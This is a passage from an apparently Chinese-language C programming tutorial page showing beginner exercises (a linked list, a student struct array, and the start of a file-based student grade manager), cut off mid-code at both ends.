temp-&gt;next;</span><br><span class="line">        position++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;节点未找到。\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modifyNode</span><span class="params">(<span class="type">int</span> position, <span class="type">int</span> newData)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表为空。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span> &amp;&amp; i &lt; position) &#123;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;错误的位置。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp-&gt;data = newData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表为空。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, temp-&gt;data);</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    createList(<span class="number">1</span>);</span><br><span class="line">    createList(<span class="number">2</span>);</span><br><span class="line">    createList(<span class="number">3</span>);</span><br><span class="line">    createList(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始链表：&quot;</span>);</span><br><span class="line">    displayList();</span><br><span class="line"></span><br><span class="line">    insertNode(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;在位置2插入节点5之后：&quot;</span>);</span><br><span class="line">    displayList();</span><br><span class="line"></span><br><span class="line">    deleteNode(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;删除位置1的节点之后：&quot;</span>);</span><br><span class="line">    displayList();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> searchPosition = searchNode(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (searchPosition != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;节点3在位置%d上找到。\n&quot;</span>, searchPosition);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifyNode(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;将位置0的节点修改为10之后：&quot;</span>);</span><br><span class="line">    displayList();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>结构体数组：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：C3ngH</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>* <span class="title">students</span>;</span></span><br><span class="line"><span class="type">int</span> numStudents = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> maxStudents = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加学生</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addStudent</span><span class="params">(<span class="type">int</span> id, <span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (numStudents == maxStudents) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;已达到最大学生数量。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    students[numStudents].id = id;</span><br><span class="line">    <span class="built_in">strcpy</span>(students[numStudents].name, name);</span><br><span class="line">    students[numStudents].age = age;</span><br><span class="line"></span><br><span class="line">    numStudents++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除学生</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteStudent</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> deleteIndex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numStudents; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (students[i].id == id) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            deleteIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = deleteIndex; i &lt; numStudents - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            students[i] = students[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        numStudents--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;已删除学生：%d\n&quot;</span>, id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学生：%d\n&quot;</span>, id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找学生</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">searchStudent</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numStudents; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (students[i].id == id) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;学生信息：\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;学号：%d\n&quot;</span>, students[i].id);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：%s\n&quot;</span>, students[i].name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;年龄：%d\n&quot;</span>, students[i].age);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学生：%d\n&quot;</span>, id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modifyStudent</span><span class="params">(<span class="type">int</span> id, <span class="type">const</span> <span class="type">char</span>* newName, <span class="type">int</span> newAge)</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numStudents; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (students[i].id == id) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(students[i].name, newName);</span><br><span class="line">            students[i].age = newAge;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;已修改学生：%d\n&quot;</span>, id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学生：%d\n&quot;</span>, id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印学生列表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printStudentList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生列表：\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numStudents; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;学号：%d，姓名：%s，年龄：%d\n&quot;</span>,</span><br><span class="line">               students[i].id, students[i].name, students[i].age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 分配内存给学生数组</span></span><br><span class="line">    students = (<span class="keyword">struct</span> Student*)<span class="built_in">malloc</span>(maxStudents * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Student));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加学生</span></span><br><span class="line">    addStudent(<span class="number">1</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line">    addStudent(<span class="number">2</span>, <span class="string">&quot;李四&quot;</span>, <span class="number">21</span>);</span><br><span class="line">    addStudent(<span class="number">3</span>, <span class="string">&quot;王五&quot;</span>, <span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印学生列表</span></span><br><span class="line">    printStudentList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除学生</span></span><br><span class="line">    deleteStudent(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印学生列表</span></span><br><span class="line">    printStudentList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找学生</span></span><br><span class="line">    searchStudent(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改学生信息</span></span><br><span class="line">    modifyStudent(<span class="number">1</span>, <span class="string">&quot;赵六&quot;</span>, <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印学生列表</span></span><br><span class="line">    printStudentList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(students);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="综合训练三：学生成绩管理系统"><a href="#综合训练三：学生成绩管理系统" class="headerlink" title="综合训练三：学生成绩管理系统"></a>综合训练三：学生成绩管理系统</h3><ul><li>txt文件读写版：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：C3ngH</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_STUDENTS 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 储存学生信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> studentID;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="type">int</span> mathScore;</span><br><span class="line">    <span class="type">int</span> programmingScore;</span><br><span class="line">&#125; Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示主菜单</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayMainMenu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;主菜单\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. 新建数据\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. 添加数据\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. 删除数据\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. 排序\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5. 查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6. 退出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入序号选择相应操作:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建数据文件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">createDataFile</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建数据文件时出现错误\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;数据文件data.txt已成功创建\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addData</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开数据文件时出现错误\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Student student;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入学号:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;student.studentID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入学生姓名:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, student.name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入数学成绩:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;student.mathScore);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入程序设计成绩:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;student.programmingScore);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(file, <span class="string">&quot;%ld %s %d %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已成功添加数据\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">long</span> studentID;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入要删除的学生学号:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;studentID);</span><br><span class="line"></span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开数据文件时发生错误\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *tempFile = fopen(<span class="string">&quot;temp.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (tempFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建临时文件时发生错误\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Student student;</span><br><span class="line">    <span class="type">int</span> deleted = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">        <span class="keyword">if</span> (student.studentID != studentID) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(tempFile, <span class="string">&quot;%ld %s %d %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            deleted = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    fclose(tempFile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deleted) &#123;</span><br><span class="line">        remove(<span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">        rename(<span class="string">&quot;temp.txt&quot;</span>, <span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">        <span 